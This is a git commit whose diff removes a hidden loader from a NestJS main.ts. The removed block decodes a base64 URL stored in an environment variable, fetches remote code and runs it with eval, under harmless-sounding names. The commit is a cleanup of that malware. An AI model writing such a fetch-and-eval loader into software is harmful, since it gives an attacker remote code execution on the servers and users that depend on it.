e6f16c0699cd866e670f1324d1a4d610e4d6c0dd
Rafi-Sharka <rafisharkar144@gmail.com>
2026-05-21 05:38:23 +0600

    fix virus issue

--- src/main.ts
+++ src/main.ts
@@ -8,19 +8,6 @@ import { PrismaExceptionFilter } from './common/filters/prisma-exception.filter'
 import { HttpExceptionFilter } from './common/filters/http-exception.filter';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 async function bootstrap() {
   const app = await NestFactory.create(AppModule);
 
